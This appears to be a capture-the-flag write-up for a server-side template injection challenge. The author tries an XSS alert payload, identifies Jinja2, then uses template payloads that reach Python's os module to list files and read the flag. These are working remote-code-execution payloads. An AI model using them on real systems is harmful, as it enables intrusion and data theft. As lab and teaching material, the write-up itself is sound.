# 🧪 SSTI1

## 🔍 Observations

- A single input box was present.
- A warning label indicated that announcements are only shown to individual users.
- Initially suspected the input box might be vulnerable.

---

## 🧠 Thought Process

- First attempted a basic XSS payload:
  ```html
  <script>
    alert("hello");
  </script>
  ```
  Nothing happened — this led me to believe it might be a different type of vulnerability.
- Unsure how to proceed, I checked the **hint**, which mentioned:

  > _"Server Side Template Injection"_

- I hadn’t encountered SSTI before, so I began researching:  
  📚 [PortSwigger: SSTI Guide](https://portswigger.net/web-security/server-side-template-injection#constructing-a-server-side-template-injection-attack)

- I learned that SSTI occurs when user input is **evaluated inside server-side templates** without proper sanitization. This sounded familiar — I had seen templating behavior like this before but didn’t know it had a specific name.

- Using that article, I successfully identified the vulnerability in the challenge.
  Each test input helped narrow down which templating engine was being used — confirming that the app was vulnerable to Jinja2-based SSTI.
  ![Template Identification](./images/image.png)  
   _(Image from PortSwigger’s guide)_

- The input field was using **Jinja2** (a Python templating engine), and the server was rendering the input directly — without sanitization.

---

## 🧨 Exploitation

- Since SSTI was new to me, I kept reading — the most helpful resource was:  
  💡 [OnSecurity: Server-Side Template Injection with Jinja2](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/)

- This guide explained how Jinja2 exposes core functions like `__globals__`, and how unsanitized input can let an attacker access Python’s built-in modules.

- In Python, the `os` module is often available by default, so if accessible through the template, it can be used to run system commands.

### 🔧 Payloads Used:

1. **List files in the current directory:**

   ```jinja2
   {{ cycler.__init__.__globals__.os.popen("ls").read() }}
   ```

   Output:

   ```
   __pycache__  app.py  flag  requirements.txt
   ```

2. **Read the flag file:**
   ```jinja2
   {{ cycler.__init__.__globals__.os.popen("cat flag").read() }}
   ```

✅ This returned the flag and completed the challenge.

---

## 📝 What I Learned

- **SSTI (Server-Side Template Injection)**
  - What it is and how it works.
  - How to identify templating behavior that may be vulnerable.
  - The dangers of rendering unsanitized input in server-side templates.
  - Techniques for exploiting Jinja2-based SSTI vulnerabilities using Python internals.
